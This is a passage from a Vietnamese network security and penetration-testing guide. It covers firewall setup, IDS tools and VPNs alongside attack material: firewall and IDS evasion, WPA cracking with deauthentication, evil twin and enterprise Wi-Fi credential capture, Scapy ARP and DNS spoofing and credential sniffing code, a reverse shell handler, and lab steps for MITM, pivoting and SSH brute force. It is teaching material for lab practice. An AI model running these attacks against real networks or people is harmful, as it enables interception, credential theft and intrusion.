# Cho phép SSH (port 22)
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Cho phép HTTP/HTTPS
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Cho phép loopback
sudo iptables -A INPUT -i lo -j ACCEPT

# Cho phép established connections
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Block tất cả traffic khác (DEFAULT DENY)
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# === RULES NÂNG CAO ===

# Rate limit SSH (chống brute force)
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent \
  --set --name SSH
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent \
  --update --seconds 60 --hitcount 4 --name SSH -j DROP

# Block port scan (SYN flood protection)
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP

# Block ICMP (ẩn khỏi ping)
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Cho phép ping nhưng rate limit
sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit \
  --limit 1/s --limit-burst 4 -j ACCEPT

# Log trước khi drop
sudo iptables -A INPUT -j LOG --log-prefix "DROPPED: " --log-level 7
sudo iptables -A INPUT -j DROP

# Block specific country (dùng ipset)
sudo ipset create cn hash:net
sudo ipset add cn 1.0.0.0/8
sudo iptables -A INPUT -m set --match-set cn src -j DROP

# === NAT ===

# SNAT (Source NAT - thay đổi source IP khi đi ra)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# DNAT (Destination NAT - port forwarding từ ngoài vào)
sudo iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT \
  --to-destination 192.168.1.100:80

# Port forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 \
  -j DNAT --to 192.168.1.100:80
sudo iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE

# === QUẢN LÝ RULES ===

# Xóa rule theo số dòng
sudo iptables -D INPUT 3

# Xóa tất cả rules
sudo iptables -F

# Lưu rules (Debian/Ubuntu)
sudo iptables-save > /etc/iptables/rules.v4
sudo ip6tables-save > /etc/iptables/rules.v6

# Restore rules
sudo iptables-restore < /etc/iptables/rules.v4
```

### iptables Firewall Script mẫu (Production)

```bash
#!/bin/bash
# Firewall script cho web server

# Xóa rules cũ
iptables -F
iptables -X
iptables -t nat -F

# Default policy: DROP tất cả
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Loopback
iptables -A INPUT -i lo -j ACCEPT

# Established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# SSH (rate limited)
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --set --name SSH
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# HTTP/HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# DNS (nếu là DNS server)
# iptables -A INPUT -p tcp --dport 53 -j ACCEPT
# iptables -A INPUT -p udp --dport 53 -j ACCEPT

# ICMP (limited)
iptables -A INPUT -p icmp --icmp-type echo-request \
  -m limit --limit 1/s -j ACCEPT

# Anti-spoofing
iptables -A INPUT -s 10.0.0.0/8 -i eth0 -j DROP
iptables -A INPUT -s 172.16.0.0/12 -i eth0 -j DROP
iptables -A INPUT -s 192.168.0.0/16 -i eth0 -j DROP

# Log dropped
iptables -A INPUT -j LOG --log-prefix "FW-DROP: "
iptables -A INPUT -j DROP

# Lưu
iptables-save > /etc/iptables/rules.v4
```

## 7.3 nftables (iptables thế hệ mới)

```bash
# nftables thay thế iptables từ Linux kernel 3.13+
# Cú pháp dễ đọc hơn, performance tốt hơn

# Liệt kê rules
sudo nft list ruleset

# Tạo table và chain
sudo nft add table inet filter
sudo nft add chain inet filter input { type filter hook input priority 0 \; policy drop \; }

# Thêm rules
sudo nft add rule inet filter input iif lo accept
sudo nft add rule inet filter input ct state established,related accept
sudo nft add rule inet filter input tcp dport 22 accept
sudo nft add rule inet filter input tcp dport { 80, 443 } accept
sudo nft add rule inet filter input icmp type echo-request limit rate 1/second accept

# NAT
sudo nft add table ip nat
sudo nft add chain ip nat postrouting { type nat hook postrouting priority 100 \; }
sudo nft add rule ip nat postrouting oifname "eth0" masquerade

# Lưu
sudo nft list ruleset > /etc/nftables.conf
```

## 7.4 Windows Firewall

```powershell
# === PowerShell ===

# Xem tất cả rules
Get-NetFirewallRule | Format-Table Name, DisplayName, Direction, Action

# Xem rules active
Get-NetFirewallRule -Enabled True

# Cho phép port
New-NetFirewallRule -DisplayName "Allow SSH" -Direction Inbound `
  -Protocol TCP -LocalPort 22 -Action Allow

# Block IP
New-NetFirewallRule -DisplayName "Block Attacker" -Direction Inbound `
  -RemoteAddress 10.10.10.100 -Action Block

# Block port
New-NetFirewallRule -DisplayName "Block Telnet" -Direction Inbound `
  -Protocol TCP -LocalPort 23 -Action Block

# Cho phép program
New-NetFirewallRule -DisplayName "Allow App" -Direction Inbound `
  -Program "C:\App\app.exe" -Action Allow

# Xóa rule
Remove-NetFirewallRule -DisplayName "Allow SSH"

# Disable firewall (KHÔNG khuyến khích)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Xem profile
Get-NetFirewallProfile

# === netsh (CMD) ===
netsh advfirewall show allprofiles
netsh advfirewall firewall add rule name="Allow SSH" dir=in action=allow protocol=tcp localport=22
netsh advfirewall firewall show rule name=all
netsh advfirewall firewall delete rule name="Allow SSH"
```

## 7.5 pfSense (Open Source Firewall/Router)

```
pfSense là firewall/router dựa trên FreeBSD. Dùng cho:
- Firewall doanh nghiệp
- VPN server
- Network segmentation
- IDS/IPS (với Suricata/Snort)

Cấu hình cơ bản:
1. WAN interface: Kết nối Internet
2. LAN interface: Mạng nội bộ
3. Rules: Firewall → Rules → [Interface] → Add

Rule structure:
- Action: Pass / Block / Reject
- Interface: WAN / LAN / OPT1
- Direction: In / Out
- Protocol: TCP / UDP / ICMP / Any
- Source: Network / IP / Alias
- Destination: Network / IP / Alias
- Port: Specific / Range / Alias

VPN:
- OpenVPN: Wizard → Server → Client export
- IPsec: VPN → IPsec → Tunnels
- WireGuard: System → Package Manager → Install WireGuard
```

## 7.6 Firewall Evasion Techniques (Red Team)

```bash
# === Fragmentation ===
# Chia packet nhỏ để bypass inspection
nmap -f 192.168.1.100              # Fragment packets (8 bytes)
nmap -f -f 192.168.1.100           # 16-byte fragments
nmap --mtu 24 192.168.1.100        # Custom MTU

# === Decoy ===
# Giả mạo nhiều source IP
nmap -D RND:10 192.168.1.100       # 10 random decoys
nmap -D 10.0.0.1,10.0.0.2,ME 192.168.1.100

# === Source port manipulation ===
# Một số firewall cho phép traffic từ port 53 (DNS) hoặc 80
nmap --source-port 53 192.168.1.100
nmap -g 53 192.168.1.100

# === Timing ===
nmap -T0 192.168.1.100             # Paranoid (5 min/probe)
nmap -T1 192.168.1.100             # Sneaky (15 sec/probe)
nmap -T2 192.168.1.100             # Polite

# === Idle scan ===
nmap -sI zombie:80 192.168.1.100

# === Custom packets với hping3 ===
# SYN scan giả source port 80
hping3 -S -p 445 -s 80 192.168.1.100

# Xmas scan
hping3 -F -S -R -P -A -U -p 80 192.168.1.100

# === Tunneling qua allowed ports ===
# HTTP tunnel (port 80/443 thường cho phép)
# DNS tunnel (port 53 thường cho phép)
# ICMP tunnel (ICMP đôi khi cho phép)

# === IPv6 ===
# Nhiều firewall chỉ filter IPv4, quên IPv6
nmap -6 fe80::1

# === Packet crafting với Scapy ===
# Xem phần Advanced Topics
```

## 7.7 IDS/IPS (Intrusion Detection/Prevention System)

### Snort

```bash
# Snort modes:
# 1. Sniffer: tcpdump-like
snort -v -i eth0

# 2. Packet Logger: Log packets
snort -dev -l /var/log/snort

# 3. IDS: Detect intrusion
snort -A console -q -c /etc/snort/snort.conf -i eth0

# Snort rules:
# alert tcp any any -> $HOME_NET 80 (msg:"HTTP GET"; content:"GET"; sid:1000001; rev:1;)

# Rule format:
# action protocol src_ip src_port -> dst_ip dst_port (options)
#
# Actions: alert, log, pass, drop (IPS mode), reject
# Options: msg, content, pcre, sid, rev, classtype, priority
```

### Suricata

```bash
# Suricata (Snort alternative, multi-threaded, faster)
suricata -c /etc/suricata/suricata.yaml -i eth0

# IDS mode
suricata -c /etc/suricata/suricata.yaml -i eth0

# IPS mode (inline)
suricata -c /etc/suricata/suricata.yaml -q 0

# Rules tương thích Snort
# Thêm rule sources: ET Open, ET Pro
```

### Evading IDS/IPS

```bash
# Fragmentation
nmap -f target

# Encryption (IDS không đọc được encrypted traffic)
# Tunnel qua HTTPS/SSH

# Encoding
# URL encode, double encode, unicode

# Polymorphic payloads
# Thay đổi signature mỗi lần

# Timing
# Slow scan dưới threshold

# Protocol-level evasion
# TCP segmentation reassembly differences
# IP fragmentation overlapping
```

---

# PHẦN 8: WIRELESS NETWORK ATTACKS

## 8.1 Wi-Fi Fundamentals

```
Standards:
802.11a  →  5GHz,   54 Mbps
802.11b  →  2.4GHz, 11 Mbps
802.11g  →  2.4GHz, 54 Mbps
802.11n  →  2.4/5GHz, 600 Mbps   (Wi-Fi 4)
802.11ac →  5GHz,   6.9 Gbps    (Wi-Fi 5)
802.11ax →  2.4/5/6GHz, 9.6 Gbps (Wi-Fi 6)

Security protocols:
WEP     → Broken, KHÔNG BAO GIỜ dùng
WPA     → TKIP, có weakness
WPA2    → AES-CCMP, chuẩn hiện tại
WPA3    → SAE (Simultaneous Authentication of Equals), mới nhất
WPA2-Enterprise → 802.1X + RADIUS (dùng trong doanh nghiệp)
```

## 8.2 Wireless Reconnaissance

```bash
# Bật monitor mode
sudo airmon-ng start wlan0
# → Interface chuyển thành wlan0mon

# Scan Wi-Fi networks
sudo airodump-ng wlan0mon

# Output:
# BSSID              PWR  CH  ENC   ESSID
# AA:BB:CC:DD:EE:FF  -50  6   WPA2  TargetNetwork
# ...

# Scan channel cụ thể
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Tắt monitor mode
sudo airmon-ng stop wlan0mon
```

## 8.3 WPA/WPA2 Cracking

### 4-Way Handshake Capture

```bash
# Bước 1: Monitor mode
sudo airmon-ng start wlan0

# Bước 2: Scan target
sudo airodump-ng wlan0mon

# Bước 3: Capture handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Bước 4: Deauth client (force reconnect → capture handshake)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
# -0 5: Gửi 5 deauth frames

# Khi thấy "WPA handshake: AA:BB:CC:DD:EE:FF" → capture thành công!

# Bước 5: Crack handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Hoặc dùng hashcat (GPU, nhanh hơn nhiều)
# Convert cap → hccapx
hcxpcapngtool -o hash.hc22000 handshake-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

### PMKID Attack (Không cần client!)

```bash
# Dùng hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

## 8.4 Evil Twin Attack

**Nguyên lý**: Tạo AP giả với cùng tên (SSID) → victim kết nối → MITM.

```bash
# Dùng Fluxion (automated)
git clone https://github.com/FluxionNetwork/fluxion
cd fluxion
sudo ./fluxion.sh

# Hoặc thủ công:
# 1. Tạo AP giả với hostapd
# 2. DHCP server (dnsmasq)
# 3. Captive portal (fake login page)
# 4. Deauth real AP → clients reconnect → connect giả

# Dùng wifiphisher
sudo wifiphisher
```

## 8.5 WPA2-Enterprise Attack

```bash
# Dùng eaphammer
sudo python3 eaphammer --bssid AA:BB:CC:DD:EE:FF --essid CorpWifi \
  --channel 6 --interface wlan0 --auth wpa-enterprise --creds

# Khi user kết nối → capture NTLM hash / credentials
```

## 8.6 Bluetooth Attacks

```bash
# Scan Bluetooth devices
hcitool scan
hcitool lescan     # BLE (Bluetooth Low Energy)

# Enumerate services
sdptool browse XX:XX:XX:XX:XX:XX

# BlueSmack (Bluetooth DoS)
l2ping -s 600 XX:XX:XX:XX:XX:XX

# BLE sniffing
btlejack -d XX:XX:XX:XX:XX:XX
```

---

# PHẦN 9: ADVANCED TOPICS

## 9.1 Scapy - Packet Crafting với Python

Scapy cho phép tạo, gửi, nhận, phân tích packet ở mọi tầng.

```python
from scapy.all import *

# === Tạo và gửi packet ===

# ICMP ping
packet = IP(dst="192.168.1.1") / ICMP()
response = sr1(packet, timeout=2)
print(response.summary())

# TCP SYN packet
syn = IP(dst="192.168.1.100") / TCP(dport=80, flags="S")
response = sr1(syn, timeout=2)

# Kiểm tra response
if response:
    if response[TCP].flags == "SA":  # SYN-ACK
        print("Port 80 is OPEN")
    elif response[TCP].flags == "RA":  # RST-ACK
        print("Port 80 is CLOSED")

# === ARP Scan ===
ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.0/24"),
                 timeout=2, verbose=False)
for sent, received in ans:
    print(f"{received.psrc} → {received.hwsrc}")

# === ARP Spoofing ===
def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(packet, verbose=False)

# === DNS Spoofing ===
def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):
        spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                  UDP(dport=pkt[UDP].sport, sport=53) / \
                  DNS(id=pkt[DNS].id, qr=1, aa=1,
                      qd=pkt[DNS].qd,
                      an=DNSRR(rrname=pkt[DNSQR].qname,
                               rdata="192.168.1.200"))
        send(spoofed, verbose=False)

sniff(filter="udp port 53", prn=dns_spoof)

# === Port Scanner ===
def syn_scan(target, ports):
    results = {}
    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=1, verbose=False)
        if resp and resp[TCP].flags == 0x12:  # SYN-ACK
            results[port] = "open"
            # Send RST to close
            send(IP(dst=target) / TCP(dport=port, flags="R"), verbose=False)
        elif resp and resp[TCP].flags == 0x14:  # RST
            results[port] = "closed"
        else:
            results[port] = "filtered"
    return results

print(syn_scan("192.168.1.100", [22, 80, 443, 8080]))

# === Traceroute ===
ans, unans = sr(IP(dst="8.8.8.8", ttl=(1,30)) / ICMP(), timeout=2)
for sent, received in ans:
    print(f"TTL={sent.ttl}: {received.src}")

# === Sniffing ===
def packet_callback(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode(errors='ignore')
        if "password" in payload.lower() or "pass=" in payload.lower():
            print(f"[!] Possible credentials: {payload[:200]}")

sniff(filter="tcp port 80", prn=packet_callback, store=False)

# === Packet analysis ===
packets = rdpcap("capture.pcap")
for pkt in packets:
    if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
        print(f"DNS Query: {pkt[DNSQR].qname.decode()}")
```

## 9.2 VPN Internals

### VPN Types

```
1. IPsec VPN
   - Transport Mode: Encrypt payload, giữ nguyên IP header
   - Tunnel Mode: Encrypt toàn bộ packet, thêm IP header mới
   - Protocols: ESP (Encapsulating Security Payload), AH (Authentication Header)
   - IKE (Internet Key Exchange) cho key negotiation

2. SSL/TLS VPN
   - Hoạt động ở Layer 4-7
   - OpenVPN (OpenSSL), Cisco AnyConnect
   - Dễ deploy, đi qua NAT/firewall

3. WireGuard
   - Modern, nhanh, simple
   - Dùng Curve25519, ChaCha20, Poly1305
   - Kernel-level (nhanh hơn OpenVPN)

4. SSH VPN (Poor man's VPN)
   - ssh -D 1080 (SOCKS proxy)
   - sshuttle (transparent proxy)
```

### WireGuard Setup

```bash
# === Server ===
# Tạo key pair
wg genkey | tee server_private.key | wg pubkey > server_public.key

# Config: /etc/wireguard/wg0.conf
[Interface]
Address = 10.0.0.1/24
ListenPort = 51820
PrivateKey = <server_private_key>
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

[Peer]
PublicKey = <client_public_key>
AllowedIPs = 10.0.0.2/32

# Start
sudo wg-quick up wg0

# === Client ===
wg genkey | tee client_private.key | wg pubkey > client_public.key

[Interface]
Address = 10.0.0.2/24
PrivateKey = <client_private_key>
DNS = 1.1.1.1

[Peer]
PublicKey = <server_public_key>
Endpoint = server-ip:51820
AllowedIPs = 0.0.0.0/0    # Route tất cả traffic qua VPN
PersistentKeepalive = 25

sudo wg-quick up wg0
```

### OpenVPN

```bash
# Quick setup với easy-rsa
# Server
apt install openvpn easy-rsa
make-cadir /etc/openvpn/easy-rsa
cd /etc/openvpn/easy-rsa
./easyrsa init-pki
./easyrsa build-ca
./easyrsa gen-req server nopass
./easyrsa sign-req server server
./easyrsa gen-dh
openvpn --genkey secret ta.key

# Client
./easyrsa gen-req client1 nopass
./easyrsa sign-req client client1

# Dùng script tự động: https://github.com/angristan/openvpn-install
```

## 9.3 TLS/SSL Deep Dive

### Certificate Chain

```
Root CA (Self-signed, pre-installed trong OS/browser)
  └── Intermediate CA (Signed by Root)
        └── Server Certificate (Signed by Intermediate)
              └── Domain: example.com
```

### TLS Testing

```bash
# Xem certificate
openssl s_client -connect example.com:443
openssl s_client -connect example.com:443 -showcerts

# Xem certificate details
echo | openssl s_client -connect example.com:443 2>/dev/null | \
  openssl x509 -noout -text

# Check expiry
echo | openssl s_client -connect example.com:443 2>/dev/null | \
  openssl x509 -noout -dates

# Test SSL/TLS vulnerabilities
# testssl.sh (comprehensive)
./testssl.sh example.com

# sslscan
sslscan example.com

# Nmap SSL scripts
nmap --script ssl-enum-ciphers -p 443 example.com
nmap --script ssl-heartbleed -p 443 example.com
nmap --script ssl-poodle -p 443 example.com
```

### SSL/TLS Attacks

```
1. POODLE (SSLv3) - Padding Oracle
2. BEAST (TLS 1.0) - CBC mode attack
3. Heartbleed (OpenSSL) - Memory leak
4. CRIME/BREACH - Compression side-channel
5. DROWN - SSLv2 cross-protocol attack
6. ROBOT - RSA padding oracle
7. Certificate Pinning Bypass - Cho mobile app testing
```

### Certificate Pinning Bypass (Mobile)

```bash
# Android
# Dùng Frida
frida -U -f com.target.app -l bypass_ssl_pinning.js

# Hoặc Objection
objection -g com.target.app explore
> android sslpinning disable

# iOS
# Dùng SSL Kill Switch 2 (jailbroken)
# Hoặc Frida script
```

## 9.4 Network Forensics

### Phân tích PCAP

```bash
# Tshark (Wireshark CLI)
# Extract HTTP objects
tshark -r capture.pcap --export-objects http,exported_files

# Extract files từ SMB
tshark -r capture.pcap --export-objects smb,exported_files

# Conversations
tshark -r capture.pcap -z conv,tcp

# Protocol hierarchy
tshark -r capture.pcap -z io,phs

# DNS queries
tshark -r capture.pcap -Y dns.qry.name -T fields -e dns.qry.name | sort -u

# HTTP requests
tshark -r capture.pcap -Y http.request -T fields -e http.host -e http.request.uri

# Credentials (plaintext)
tshark -r capture.pcap -Y 'http.request.method == POST' -T fields \
  -e http.host -e http.request.uri -e urlencoded-form.value

# Follow TCP stream
tshark -r capture.pcap -z follow,tcp,ascii,0

# === NetworkMiner ===
# GUI tool, tự động extract files, images, credentials từ pcap

# === Zeek (Bro) ===
# Network analysis framework
zeek -r capture.pcap
# Tạo ra nhiều log files: conn.log, http.log, dns.log, files.log, v.v.
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p
cat http.log | zeek-cut host uri
cat dns.log | zeek-cut query
```

## 9.5 IPv6 Attacks

```bash
# IPv6 scanning
nmap -6 fe80::1%eth0

# IPv6 neighbor discovery
sudo ip -6 neigh show

# THC-IPv6 toolkit
alive6 eth0                    # Discover IPv6 hosts
fake_router6 eth0              # Fake router advertisement
parasite6 eth0                 # ARP spoofing equivalent for IPv6
redir6 eth0                    # Redirect traffic

# IPv6 MITM
sudo bettercap
> set net.sniff.local true
> net.probe on
> set arp.spoof.targets fe80::1
```

## 9.6 Network Automation & Scripting

### Python Networking

```python
import socket
import struct
import subprocess

# === TCP Client ===
def tcp_connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect((host, port))
        s.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
        response = s.recv(4096)
        return response.decode(errors='ignore')
    except Exception as e:
        return str(e)
    finally:
        s.close()

# === Port Scanner (multi-threaded) ===
import concurrent.futures

def scan_port(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((host, port))
    s.close()
    if result == 0:
        return port
    return None

def port_scan(host, ports):
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(scan_port, host, port): port for port in ports}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)
    return sorted(open_ports)

# === Network Sniffer ===
def simple_sniffer():
    # Raw socket (Linux only, needs root)
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    while True:
        raw_data, addr = s.recvfrom(65535)
        # Parse Ethernet header
        dest_mac, src_mac, eth_proto = struct.unpack('! 6s 6s H', raw_data[:14])
        print(f"Src: {mac_format(src_mac)} → Dst: {mac_format(dest_mac)} Proto: {eth_proto}")

def mac_format(mac_bytes):
    return ':'.join(f'{b:02x}' for b in mac_bytes)

# === Reverse Shell Handler ===
import threading

def handle_client(client_socket):
    while True:
        cmd = input("Shell> ")
        if cmd.lower() == "exit":
            client_socket.send(b"exit\n")
            break
        client_socket.send(cmd.encode() + b"\n")
        response = client_socket.recv(65535)
        print(response.decode(errors='ignore'))
    client_socket.close()

def listener(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(1)
    print(f"[*] Listening on port {port}")
    client, addr = server.accept()
    print(f"[+] Connection from {addr}")
    handle_client(client)
```

### Bash Network Scripts

```bash
# === Quick subnet scanner ===
#!/bin/bash
subnet=$1  # e.g., 192.168.1
for host in $(seq 1 254); do
    (ping -c 1 -W 1 $subnet.$host &>/dev/null && \
     echo "[+] $subnet.$host is alive") &
done
wait

# === Port scanner ===
#!/bin/bash
target=$1
for port in $(seq 1 1024); do
    (echo >/dev/tcp/$target/$port) 2>/dev/null && \
    echo "[+] Port $port is open"
done

# === Banner grabber ===
#!/bin/bash
target=$1
for port in 21 22 25 80 443 3306 8080; do
    banner=$(echo "" | nc -w 2 $target $port 2>/dev/null | head -1)
    if [ -n "$banner" ]; then
        echo "Port $port: $banner"
    fi
done
```

---

# PHẦN 10: LAB THỰC HÀNH

## 10.1 Dựng Lab

### Virtualization

```
1. VirtualBox / VMware Workstation (Free)
   - Tải Kali Linux: https://www.kali.org/get-kali/
   - Tải Windows: https://developer.microsoft.com/windows/downloads/virtual-machines/
   - Tải vulnerable VMs (xem bên dưới)

2. Network modes:
   - NAT: VM ra Internet qua host
   - Host-only: Chỉ VM ↔ Host
   - Internal Network: Chỉ VM ↔ VM
   - Bridged: VM = device trên mạng thật

3. Lab setup recommended:
   - Kali Linux (attacker)
   - Windows 10/11 (victim)
   - Ubuntu Server (victim)
   - pfSense (firewall/router)
   - Network: Host-only hoặc Internal Network
```

### Vulnerable Machines cho Practice

```
=== Beginner ===
1. Metasploitable 2
   - Nhiều service lỗi: FTP, SSH, Telnet, HTTP, SMB, MySQL
   - Tải: https://sourceforge.net/projects/metasploitable/

2. DVWA (Damn Vulnerable Web Application)
   - Web app vulnerabilities
   - Docker: docker run -d -p 80:80 vulnerables/web-dvwa

3. TryHackMe (Online)
   - https://tryhackme.com
   - Rooms: "Network Fundamentals", "Nmap", "Wireshark"

=== Intermediate ===
4. HackTheBox (Online)
   - https://hackthebox.com
   - Machines với nhiều mức độ

5. VulnHub (Offline VMs)
   - https://vulnhub.com
   - Kipling, Brainpan, SickOs, Stapler

6. DVCP (Damn Vulnerable Cloud Platform)
   - Cloud security practice

=== Advanced ===
7. Active Directory Lab
   - 1 Windows Server (Domain Controller)
   - 2-3 Windows 10 (domain-joined)
   - Cài đặt: DVAD, GOAD (Game of Active Directory)

8. Cyber Range
   - RangeForce, Immersive Labs (commercial)
```

## 10.2 Network Lab Exercises

### Lab 1: Network Discovery & Scanning

```bash
# Mục tiêu: Tìm tất cả host và service trong mạng lab

# Bước 1: Tìm subnet
ip addr show

# Bước 2: ARP scan
sudo arp-scan -l

# Bước 3: Nmap host discovery
nmap -sn 192.168.56.0/24

# Bước 4: Port scan các host tìm được
nmap -sS -sV -sC -p- -oA lab1_scan 192.168.56.101

# Bước 5: Phân tích kết quả
# Xác định: OS, services, versions, potential vulnerabilities
```

### Lab 2: MITM Attack

```bash
# Mục tiêu: ARP spoof và capture credentials

# Bước 1: Bật IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Bước 2: ARP spoof
sudo arpspoof -i eth0 -t 192.168.56.101 192.168.56.1 &
sudo arpspoof -i eth0 -t 192.168.56.1 192.168.56.101 &

# Bước 3: Capture traffic
sudo tcpdump -i eth0 -A -s 0 'port 80' -w mitm_capture.pcap

# Bước 4: Trên victim, truy cập HTTP login page

# Bước 5: Phân tích capture với Wireshark
# Follow TCP stream → tìm credentials

# Bước 6: Cleanup
kill %1 %2
echo 0 > /proc/sys/net/ipv4/ip_forward
```

### Lab 3: Pivoting

```bash
# Setup:
# Attacker (10.10.10.5) → Pivot Host (10.10.10.10 + 172.16.0.10) → Internal (172.16.0.20)

# Bước 1: Compromise pivot host (ví dụ qua SSH)
ssh user@10.10.10.10

# Bước 2: Discover internal network
# Trên pivot host:
ip addr show     # Thấy 2 interfaces
for i in $(seq 1 254); do ping -c 1 -W 1 172.16.0.$i &>/dev/null && echo "172.16.0.$i alive"; done

# Bước 3: SSH tunnel
# Trên attacker:
ssh -D 1080 user@10.10.10.10

# Bước 4: Scan internal
proxychains nmap -sT -Pn -p 22,80,445,3389 172.16.0.20

# Bước 5: Access internal service
proxychains firefox    # Truy cập http://172.16.0.20
```

### Lab 4: Firewall Configuration

```bash
# Mục tiêu: Cấu hình iptables bảo vệ server

# Bước 1: Default deny
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# Bước 2: Allow essential
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Bước 3: Test từ attacker
nmap -sS 192.168.56.101   # Chỉ thấy port 22, 80

# Bước 4: Thêm rate limiting
sudo iptables -I INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --set --name SSH
sudo iptables -I INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP

# Bước 5: Test brute force → bị block sau 3 attempts
hydra -l root -P small_wordlist.txt ssh://192.168.56.101
```

## 10.3 Certification Paths

```
Beginner → Advanced:

1. CompTIA Network+
   - Nền tảng networking
   - Cần cho security role

2. CompTIA Security+
   - Security fundamentals
   - Nhiều công ty yêu cầu

3. CEH (Certified Ethical Hacker)
   - Ethical hacking methodology
   - Breadth over depth

4. eJPT (eLearnSecurity Junior Penetration Tester)
   - Hands-on, practical
   - Entry-level pentest cert

5. OSCP (Offensive Security Certified Professional)
   - Gold standard cho pentest
   - 24h hands-on exam
   - BẮT BUỘC phải có nếu muốn làm pentest

6. CRTP (Certified Red Team Professional)
   - Active Directory attacks
   - Pentester Academy

7. OSEP (Offensive Security Experienced Penetration Tester)
   - Advanced pentesting
   - Evasion, custom exploits

8. CRTO (Certified Red Team Operator)
   - Red team operations
   - C2, evasion, OPSEC
```

## 10.4 Methodology

### Network Penetration Testing Methodology

```
Phase 1: Reconnaissance
├── Passive
│   ├── OSINT (Shodan, Censys, Google Dorks)
│   ├── DNS enumeration (amass, subfinder)
│   ├── WHOIS lookup
│   └── Social engineering research
└── Active
    ├── Host discovery (nmap -sn)
    ├── Port scanning (nmap -sS -p-)
    ├── Service enumeration (nmap -sV -sC)
    └── OS fingerprinting (nmap -O)

Phase 2: Vulnerability Analysis
├── Automated scanning (Nessus, OpenVAS)
├── Manual verification
├── Research CVEs for identified services
└── Check default credentials

Phase 3: Exploitation
├── Network attacks (MITM, relay)
├── Service exploitation (Metasploit, manual)
├── Password attacks (spray, brute force)
└── Client-side attacks (phishing, evil twin)

Phase 4: Post-Exploitation
├── Privilege escalation
├── Persistence
├── Credential harvesting
├── Lateral movement
├── Pivoting to internal networks
└── Data exfiltration

Phase 5: Reporting
├── Executive summary
├── Technical findings
├── Risk ratings (CVSS)
├── Remediation recommendations
└── Evidence (screenshots, logs)
```

---

# TỔNG KẾT & RESOURCES

## Cheat Sheet nhanh

```
Discover hosts     → nmap -sn 192.168.1.0/24
Scan ports         → nmap -sS -sV -sC -p- target
Web enum           → gobuster/ffuf/nikto
Exploit search     → searchsploit service_version
MITM               → bettercap (arp.spoof + net.sniff)
